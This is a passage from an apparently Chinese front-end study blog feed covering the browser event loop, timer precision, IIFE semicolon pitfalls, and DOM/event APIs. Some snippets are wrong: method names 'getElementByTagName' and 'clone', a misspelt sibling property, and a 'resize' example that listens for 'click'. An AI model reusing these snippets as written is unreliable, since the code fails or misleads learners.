title="渲染主线程"></a>渲染主线程</h2><p>渲染主线程是浏览器中最繁忙的线程，需要它处理的任务包括但不限于：</p><ul><li>解析html</li><li>解析CSS</li><li>计算样式</li><li>布局</li><li>处理图层</li><li>每秒绘制画面60次</li><li>执行全局js代码</li><li>执行事件处理函数</li><li>执行计时器的回调函数</li><li>。。。。</li></ul><p><img src="/2023/03/23/%E5%85%B3%E4%BA%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/image-20230523163751536.png" alt="image-20230523163751536"></p><h2 id="阐述js的事件循环"><a href="#阐述js的事件循环" class="headerlink" title="阐述js的事件循环"></a>阐述js的事件循环</h2><p>事件循环又叫消息循环，是浏览器渲染主线程的工作方式</p><p>在Chrome的源码中，他会开启一个不会结束的for循环，每次循环从消息队列中去除一个任务执行，而其他线程只需要在合适的时候将任务加入到队列末尾即可。</p><p>过去把消息队列简单分为宏队列和微队列，这种说法目前已无法满足复杂的浏览器环境，取而代之的是一种更加灵活多变的处理方式。</p><p>根据W3C官方的解释，每个任务有不同的类型，同类型的任务必须在同一个队列，不同的任务可以属于不同的队列。不同任务队列有不同的优先级，在一次事件循环中，由浏览器自行决定取哪一个队列的任务。但浏览器必须有一个微队列，微队列的任务一定具有最高的优先级，必须优先调度执行。</p><h2 id="任务优先级"><a href="#任务优先级" class="headerlink" title="任务优先级"></a>任务优先级</h2><p>任务没有优先级，在消息队列中先进先出</p><p>但<strong>消息队列</strong>是有优先级的</p><ul><li>每个任务都有一个任务类型，同一个类型的任务必须在一个队列，不同类型的任务可以分属于不同的队列 。<br>在一次事件循环中，浏览器可以根据实际情况从不同的队列中取任务执行 。</li><li>浏览器必须准备好一个微队列，微队列中的任务优先所有其他任务执行<br><a href="https://html.spec.whatwg.org/multipage/webappapis.html#perform-a-microtask-checkpoint">https://html.spec.whatwg.org/multipage/webappapis.html#perform-a-microtask-checkpoint</a></li></ul><blockquote><p>随着浏览器的复杂度急剧提升，w3c不再使用宏队列的说法</p></blockquote><p>在目前Chrome的实现中，至少包含了以下队列：</p><ul><li>微队列：用于存放需要最快执行的任务，优先级【最高】</li><li>交互队列：用于存放用户操作后产生的事件处理任务，优先级【高】</li><li>延时队列：用于存放计时器到达后的回调任务，优先级【中】</li></ul><blockquote><p>添加到微队列的主要方式是使用 Promise、MutationObserver</p></blockquote><h2 id="js中的计时器能否实现精确计时"><a href="#js中的计时器能否实现精确计时" class="headerlink" title="js中的计时器能否实现精确计时"></a>js中的计时器能否实现精确计时</h2><p>不可以，</p><ol><li>计算机硬件本身没有原子钟，无法做到精确计时</li><li>操作系统的计时函数本身存在着少量偏差，由于js最终调用的是操作系统的函数，也就携带了这部分偏差</li><li>按照W3C的标准，浏览器实现计时器，如果嵌套层级超过五级，则会带有4毫秒的最少时间，这样在计时时间少于4毫秒时又带来了误差</li><li>受事件循环的影响，计时器的回调函数只能在主线程空闲时运行，因此又带来了误差</li></ol><p><img src="/2023/03/23/%E5%85%B3%E4%BA%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/image-20230523155938608.png" alt="image-20230523155938608"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于js立即执行函数为什么必须加分号</title>
      <link href="/2023/03/01/%E5%85%B3%E4%BA%8Ejs%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BF%85%E9%A1%BB%E5%8A%A0%E5%88%86%E5%8F%B7/"/>
      <url>/2023/03/01/%E5%85%B3%E4%BA%8Ejs%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BF%85%E9%A1%BB%E5%8A%A0%E5%88%86%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<p>·</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这段代码的执行结果并不是想象中的输出 2</p><p>而是会报如下一个错误：<code>Error:10 is not a function</code></p><p>分析：查阅 ECMAScript 的语言规范，ECMAScript 的自动分号插入规则</p><p>在如上代码内并不会自动插入分号，而是会被这样解析：<code>var a = 10( function()&#123; console.log(2) &#125; )()</code></p><p>这样就很容易理解了</p><p>所以在立即执行函数之前一定要带上分号</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>js-WebApis</title>
      <link href="/2023/02/28/js-WebApis/"/>
      <url>/2023/02/28/js-WebApis/</url>
      
        <content type="html"><![CDATA[<blockquote><p>DOM：文档对象模型</p><p>BOM：浏览器对象模型</p></blockquote><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>DOM (Document Object ModeI 一一文档对象模型 ) 是用来呈现以及与任意 HTML 或 XML 文档交互的 API</p><p>即浏览器提供的一套专门用来操作网页内容的功能</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>开发网页内容特效和实现用户交互</p><h3 id="DOM-树"><a href="#DOM-树" class="headerlink" title="DOM 树"></a>DOM 树</h3><p>将 HTML 文档以树状结构直观的表现出来，我们称之为文档树或 DOM 树<br>直观的体现了标签与标签之间的关系</p><p><img src="/2023/02/28/js-WebApis/web-api.jpg" alt="web-api"></p><h3 id="DOM-节点"><a href="#DOM-节点" class="headerlink" title="DOM 节点"></a>DOM 节点</h3><p>DOM 树里每一个内容都称之为节点</p><h4 id="节点类型"><a href="#节点类型" class="headerlink" title="节点类型"></a>节点类型</h4><ul><li><p>元素节点</p><p>所有的标签，body,div</p></li><li><p>属性节点</p><p>所有的属性，比如 href</p></li><li><p>文本节点</p></li></ul><h3 id="DOM-对象"><a href="#DOM-对象" class="headerlink" title="DOM 对象"></a>DOM 对象</h3><p>浏览器根据 html 标签生成的 JS 对象，所有的标签属性都可以在这个对象上面找到修改这个对象的属性会自动映射到标签身上</p><ul><li><p>document 对象</p><p>是 DOM 里提供的一个对象，它提供的属性和方法都是用来访问和操作网页内容的</p><p>网页所有内容都在 document 里面</p></li></ul><h3 id="获取-DOM-对象"><a href="#获取-DOM-对象" class="headerlink" title="获取 DOM 对象"></a>获取 DOM 对象</h3><ul><li><p>根据 CSS 选择器来获取 DOM 元素</p><ul><li><p>选择匹配的第一个元素</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'css选择器'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>参数：包含一个或多个有效的 CSS 选择器 字符串</p></li><li><p>返回值：CSS 选择器匹配到的第一个元素，一个 HTMLElement 对象</p><p>如果没有匹配到，返回 null</p></li></ul></li><li><p>选择匹配的多个元素</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'css选择器'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>参数:包含一个或多个有效的 CSS 选择器 字符串</p></li><li><p>返回值：CSS 选择器匹配的 NodeList 对象集合（伪数组）</p><blockquote><p>即使只有一个元素，返回的也是一个只包含一个元素的集合</p></blockquote></li></ul></li></ul></li><li><p>父节点查找</p><ul><li><p>parentNode 属性：返回最近一级的父节点，找不到返回 null</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">子元素<span class="token punctuation">.</span>parentNode<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>子节点查找</p><ul><li>childNodes：获得所有子节点、包括文本节点（空格、换行）、注释节点等</li><li>children ： 仅获得所有元素节点（返回的是伪数组）</li></ul></li><li><p>兄弟关系查找</p><ul><li>nextElementSibling：下一个兄弟节点</li><li>previousElemetSibling：上一个兄弟节点</li></ul></li><li><p>其他获取 DOM 元素的方法（了解）</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 根据id获取一个元素</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'nav'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 根据标签获取一类元素</span>document<span class="token punctuation">.</span><span class="token function">getElementByTagName</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 根据类名获取元素</span>document<span class="token punctuation">.</span><span class="token function">getElementByClassName</span><span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="操作元素内容"><a href="#操作元素内容" class="headerlink" title="操作元素内容"></a>操作元素内容</h3><ul><li><p>元素 innerText 属性</p><p>将文本内容添加&#x2F;更新到任意标签位置</p><p>显示纯文本，不解析标签</p></li><li><p>元素.innerHTML 属性</p><p>将文本内容添加&#x2F;更新到任意标签位置</p><p>会解析标签，多标签建议使用模板字符</p></li><li><p>其他属性：href, title, src</p></li></ul><h3 id="操作元素样式属性"><a href="#操作元素样式属性" class="headerlink" title="操作元素样式属性"></a>操作元素样式属性</h3><ul><li><p>通过 style 属性操作 CSS</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">obj<span class="token punctuation">.</span>style<span class="token punctuation">.</span>样式属性 <span class="token operator">=</span> 值<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>操作类名（className）操作 css</p><p>如果修改的样式比较多，直接通过 style 属性修改比较繁琐，可以借助于 css 类名的形式</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// active是一个类名</span>元素<span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">'active'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>className 是使用新值换旧值, 如果需要添加一个类,需要保留之前的类名</p></blockquote></li><li><p>通过 classList 操作类控制 css</p><p>为了解决 className 容易覆盖以前的类名，我们可以通过 classList 方式追加和删除类名</p><ul><li><p>追加一个类</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">元素<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'类名'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>删除一个类</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">元素<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">'类名'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>切换一个类</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">元素<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">toggle</span><span class="token punctuation">(</span><span class="token string">'类名'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><blockquote><p>修改大量的样式更方便</p><p>classList 是追加和删除不影响以前类名</p></blockquote></li></ul><h3 id="操作表单元素-属性"><a href="#操作表单元素-属性" class="headerlink" title="操作表单元素 属性"></a>操作表单元素 属性</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">DOM</span>对象<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'username'</span><span class="token punctuation">;</span><span class="token constant">DOM</span>对象<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'password'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>表单属性中有一些添加了就有效果，移除就没有效果，一律使用布尔值表示 如果为 true 代表添加了该属性 如果是 false 代表移除了该属性。<code>disabled</code>，<code>checked</code>，<code>selected</code></p><h3 id="自定义属性"><a href="#自定义属性" class="headerlink" title="自定义属性"></a>自定义属性</h3><ul><li><p>标准属性：标签天生自带的属性 比如<code>class</code> <code>id</code> <code>title</code>等, 可以直接使用点语法操作比如： <code>disabled</code>、<code>checked</code>、<code>selected</code></p></li><li><p>自定义属性：</p><ul><li>在 html5 中推出来了专门的 data-自定义属性</li><li>在标签上一律以 data-开头</li><li>在 DOM 对象上一律以 dataset 对象方式获取</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span> <span class="token attr-name">data-id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>text text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> box <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.box'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>box<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="增加节点"><a href="#增加节点" class="headerlink" title="增加节点"></a>增加节点</h3><p>即创造出一个新的网页元素，再添加到网页内，一般先创建节点，然后插入节点</p><ol><li><p>创建节点</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'标签名'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>追加节点</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">父元素<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>newElem<span class="token punctuation">)</span><span class="token punctuation">;</span>父元素<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>newElem<span class="token punctuation">,</span> baseElem<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//插入到父元素中某个子元素的前面</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="克隆节点"><a href="#克隆节点" class="headerlink" title="克隆节点"></a>克隆节点</h3><p>cloneNode 会克隆出一个跟原标签一样的元素，括号内传入布尔值</p><ul><li>若为 true，则代表克隆时会包含后代节点一起克隆</li><li>若为 false，则代表克隆时不包含后代节点</li><li>默认为 false</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">元素<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span>布尔值<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">父元素<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>要删除的元素<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如不存在父子关系则删除不成功</p></blockquote><ul><li>elem.remove()</li></ul><h2 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h2><h3 id="间歇函数"><a href="#间歇函数" class="headerlink" title="间歇函数"></a>间歇函数</h3><p>每隔一段时间调用这个函数</p><ul><li><p>语法</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> id <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span>回调函数<span class="token punctuation">,</span> 间隔时间<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">clearInterval</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>间隔时间单位是 ms</p></li></ul><blockquote><p>函数名字注意不要加括号</p><p>定时器返回的是一个 id 数字</p></blockquote><h3 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h3><p>setTimeout 仅仅执行一次，就是把一段代码延迟执行</p><ul><li>语法<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>回调函数<span class="token punctuation">,</span> 等待的毫秒数<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 清除延时函数</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><blockquote><ul><li>延时器需要等待,所以后面的代码先执行</li><li>每一次调用延时器都会产生一个新的延时器</li></ul></blockquote><h2 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h2><p>事件是在编程时系统内发生的动作或者发生的事情.</p><p>事件监听就是让程序检测是否有事件产生，一旦有事件触发，就立即调用一个函数做出响应，也称为 绑定事件或者注册事件</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">元素对象<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'事件类型'</span><span class="token punctuation">,</span> 回调函数<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>事件监听三要素：</p><ul><li>事件源：哪个 dom 元素被事件触发了，要获取 dom 元素</li><li>事件类型： 用什么方式触发，比如鼠标单击 click、鼠标经过 mouseover 等</li><li>事件调用的函数： 要做什么事</li></ul><h3 id="事件类型"><a href="#事件类型" class="headerlink" title="事件类型"></a>事件类型</h3><h4 id="鼠标事件"><a href="#鼠标事件" class="headerlink" title="鼠标事件"></a>鼠标事件</h4><ul><li><p>click：单击</p></li><li><p>mouseenter：鼠标经过</p><p>非冒泡事件</p></li><li><p>mouseleave：鼠标离开</p></li></ul><h4 id="焦点事件"><a href="#焦点事件" class="headerlink" title="焦点事件"></a>焦点事件</h4><ul><li>focus：获得焦点</li><li>blur：失去焦点</li></ul><h4 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h4><ul><li>keydown：键盘按下</li><li>Keyup：键盘抬起</li></ul><h4 id="文本事件"><a href="#文本事件" class="headerlink" title="文本事件"></a>文本事件</h4><ul><li>input：用户输入事件</li></ul><h4 id="页面加载事件"><a href="#页面加载事件" class="headerlink" title="页面加载事件"></a>页面加载事件</h4><ul><li><p>load：加载外部资源（）完毕时触发的事件</p><p>监听页面所有资源加载完毕：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意：不光可以监听整个页面资源加载完毕，也可以针对某个资源绑定 load 事件</p></blockquote></li><li><p>DOMContentLoaded：当初始的 HTML 文档被完全加载和解析完成之后触发的事件，无需等待样式表&#x2F;图像等完全加载</p><p>给 document 添加 DOMContentLoaded 事件：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="页面滚动事件"><a href="#页面滚动事件" class="headerlink" title="页面滚动事件"></a>页面滚动事件</h4><ul><li>scroll：<ul><li>scrollLeft&#x2F;scrollTop：获取被卷去的大小–》获取元素内容往左，往上滚出去看不见的距离</li><li><code>document.documentElement.scrollTop</code>获取页面滚动的头部距离</li><li>scrollTo(x, y)：可以把内容滚动到指定的坐标</li></ul></li></ul><h4 id="页面尺寸事件"><a href="#页面尺寸事件" class="headerlink" title="页面尺寸事件"></a>页面尺寸事件</h4><ul><li><p>resize：在窗口尺寸改变的时候触发事件</p><p>检测屏幕宽度：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> w <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientWidth<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="元素尺寸与位置"><a href="#元素尺寸与位置" class="headerlink" title="元素尺寸与位置"></a>元素尺寸与位置</h4><ul><li><p>clientWidth&#x2F; clientHeight : 获取元素的可见部分宽高（不包含 border，margin，滚动条）</p></li><li><p>offsetWidth&#x2F;offsetHeight : 获取元素的自身宽高（包含自身的宽高，padding，border）</p><blockquote><p>如果盒子是隐藏的，获取结果为 0</p></blockquote></li></ul><ul><li>offsetLeft&#x2F;offsetTop :获取元素距离自己定位父级元素的左、上距离</li></ul><h4 id="M-端事件"><a href="#M-端事件" class="headerlink" title="M 端事件"></a>M 端事件</h4><ul><li>touchstart：手指触摸到一个 DOM 元素时触发</li><li>touchmove: 手指在一个 DOM 元素上滑动时触发</li><li>touchend: 手指从一个 DOM 元素上移开时触发</li></ul><h3 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h3><p>任意事件类型被触发时与事件相关的信息会被以对象的形式记录下来，我们称这个对象为事件对象。</p><h4 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h4><p>在事件绑定的回调函数的第一个参数就是事件对象，一般命名为 event、ev、e</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">元素<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h4><ul><li>type：获取当前事件类型</li><li>clientX&#x2F;clientY：获取光标相对于浏览器可见窗口左上角的位置</li><li>offsetX&#x2F;offsetY：获取光标相对于当前 DOM 元素左上角的位置</li><li>key：用户按下的键盘键的值</li></ul><h3 id="环境对象"><a href="#环境对象" class="headerlink" title="环境对象"></a>环境对象</h3><p>指的是函数内部特殊的变量 this ，它代表着当前函数运行时所处的环境</p><p>【谁调用， this 就是谁】 是判断 this 指向的粗略规则</p><p>直接调用函数，其实相当于是 window.函数，所以 this 指代 window</p><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>如果将函数 A 做为参数传递给函数 B 时，我们称函数 A 为回调函数</p><p>即：当一个函数当做参数来传递给另外一个函数的时候，这个函数就是回调函数</p><h2 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h2><p><img src="/2023/02/28/js-WebApis/image-20230321162733545.png" alt="image-20230321162733545"></p><h3 id="事件捕获"><a href="#事件捕获" class="headerlink" title="事件捕获"></a>事件捕获</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>从 DOM 的根元素开始去执行对应的事件 (从外到里)</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">DOM</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>事件类型<span class="token punctuation">,</span> 事件处理函数<span class="token punctuation">,</span> 是否使用捕获机制<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>addEventListener 第三个参数传入 true 代表是捕获阶段触发（很少使用）</li><li>若传入 false 代表冒泡阶段触发，默认就是 false</li><li>若是用 L0 事件监听，则只有冒泡阶段，没有捕获</li></ul></blockquote><h3 id="事件冒泡"><a href="#事件冒泡" class="headerlink" title="事件冒泡"></a>事件冒泡</h3><p>当一个元素的事件被触发时，同样的事件将会在该元素的所有祖先元素中依次被触发。这一过程被称为事件冒泡</p><h3 id="阻止冒泡"><a href="#阻止冒泡" class="headerlink" title="阻止冒泡"></a>阻止冒泡</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">事件对象<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>此方法可以阻断事件流动传播，在冒泡阶段和捕获阶段皆有效</p></blockquote><h3 id="阻止默认行为"><a href="#阻止默认行为" class="headerlink" title="阻止默认行为"></a>阻止默认行为</h3><p>我们某些情况下需要阻止默认行为的发生，比如 阻止 链接的跳转，表单域跳转</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="解绑事件"><a href="#解绑事件" class="headerlink" title="解绑事件"></a>解绑事件</h3><ul><li><p>on 事件方式，直接使用 null 覆盖就可以实现事件的解绑</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">btn<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 解绑</span>btn<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>addEventListener 方式，必须使用 removeEventListener(事件类型, 事件处理函数, [获取捕获或冒泡阶段])</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>btn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 解绑</span>btn<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h3><p>事件委托是利用事件流的特征解决一些开发需求的技巧</p><h4 id="原理"><a href="#原理" class="headerlink" 